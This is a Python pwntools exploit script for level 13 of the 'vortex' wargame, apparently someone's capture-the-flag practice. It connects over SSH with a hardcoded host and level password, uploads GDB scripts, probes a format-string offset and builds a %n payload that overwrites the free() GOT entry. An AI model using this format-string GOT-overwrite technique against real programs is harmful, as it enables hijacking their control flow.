from pwn import *
from random import randint
from time import sleep
import uuid

local_dir = None
remote_binary = None
local_binary = None
local_libc = None
libc = None
port = None
elf = None

BINARY_PATH = None
CWD = None
LOCAL = None


def pad(s, slen):
    return s + b"B" * (slen - len(s))


def connect(level, password, init=True):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global CWD
    global BINARY_PATH
    global LOCAL
    compose_download_paths(level)
    port = 2228
    connected = False
    s = None
    while not connected:
        try:
            s = ssh("vortex" + level, "176.9.9.172", password=password, cache=True, port=port)
            connected = True
            log.info("connected")
            if init:
                s.libs(remote_binary, local_dir)
        except Exception as e:
            log.info("ssh connection attempt failed")
            print("error: {0}".format(e))
            sleep(randint(1, 5))
    load_downloaded_files()
    LOCAL = False
    CWD = "/tmp/"
    BINARY_PATH = "/vortex/vortex" + level
    return s


# function of local testing vm
def connect_to_local(level, password, remote=True):
    global CWD
    global LOCAL
    global BINARY_PATH
    global local_dir
    if remote:
        connect(level, password)
    else:
        compose_download_paths(level)
        load_downloaded_files()
    s = ssh("kali", "127.0.0.1", keyfile="/home/kali/.ssh/id_rsa", cache=True)
    CWD = local_dir + "/vortex"
    BINARY_PATH = CWD + "/vortex" + level
    LOCAL = True
    return s


def load_downloaded_files():
    global elf
    global libc
    elf = ELF(local_binary)
    libc = ELF(local_libc)
    context.clear()
    context.binary = local_binary
    context.log_file = "/tmp/docgillog"


def compose_download_paths(level):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global local_libc
    local_dir = "/home/kali/PycharmProjects/vortex/" + level
    remote_binary = "/vortex/vortex" + level
    local_binary = local_dir + remote_binary
    local_libc = local_dir + "/lib32/libc.so.6"
    log.info(f"cloned_binary: {local_binary}")


def goto_bash(s, before_func=None, menu_func=None, execute=None):
    done = "0"
    while done == "0":
        if before_func:
            before_func()
        sh = s.process(["sh"])
        if execute:
            sh.sendline(execute)
        sh.interactive()
        done = input("done with sh, done?").replace("\n", "")
        if done == "2":
            menu_func()


def upload(s, content, remote_path):
    temp_path = "/tmp/" + str(uuid.uuid4())
    write(temp_path, content)
    s.upload(temp_path, remote_path)
    rm = process(["rm", "-rf", temp_path])
    rm.recvall()


gdb_script = '''
set disassembly-flavor intel   
alias gil = disassemble

#alias gili = x/2i
#alias gilr = 'x/2wx $ebp'


b *exit

# printf call in vuln
b *printf
finish
shell sleep 1
r < /tmp/docgil
'''

s = connect_to_local("13", "jMyg12=nB", remote=False)
# s = connect("13", "jMyg12=nB")
cmd = "gdb -x /tmp/gdb /vortex/vortex13"
wrapper_path = local_dir + "/vortex/wrapper"
remote_payload_path = "/tmp/docgil"
if LOCAL:
    remote_gdb_script_path = local_dir + "/vortex/gdb.script"
else:
    remote_gdb_script_path = "/tmp/gdb"

vuln_start_adr = 0x08048593
free_got = 0x804a010
printf_got = 0x804a00c
system = libc.symbols["system"]



log.info(
    "############################################################################################################################################################")
log.info("# find hammerlen")
log.info(
    "############################################################################################################################################################")

found_one = False
off_until_buf = None
for i in range(150):
    break
    log.info(f"i: {i}")
    payload = b""
    payload += b"A"*4
    payload += b"%" + bytes(str(i), "utf-8") + b"$s"
    # payload += b"%" + bytes(str(i + 1), "utf-8") + b"$c"
    # payload += b"%" + bytes(str(i + 2), "utf-8") + b"$p"
    # payload += b"%" + bytes(str(i + 3), "utf-8") + b"$p"
    payload = pad(payload, 0x14)

    upload(s, gdb_script, remote_gdb_script_path)
    upload(s, payload, remote_payload_path)

    io = s.process([wrapper_path, BINARY_PATH])
    io.send(payload)
    r = io.recvall()
    log.info(f"r: {r}")

    # if r.count(b"41") >= 2:
    if r.count(b"A") >= 2+4:
        log.info(f"found index, start of buf at {i}")
        off_until_buf = i
        break
      
# goto_bash(s, execute=cmd)

log.info("############################################################################################################################################################")
log.info("# overwrite free's got")
log.info("############################################################################################################################################################")


off_until_buf = 7

payload = b""
payload += pack(free_got, 32)
payload += b"%" + bytes(str(off_until_buf), "utf-8") + b"$100n"
payload = pad(payload, 0x14)

upload(s, gdb_script, remote_gdb_script_path)
upload(s, payload, remote_payload_path)

io = s.process([wrapper_path, BINARY_PATH])
io.send(payload)
r = io.recvall()
log.info(f"r: {r}")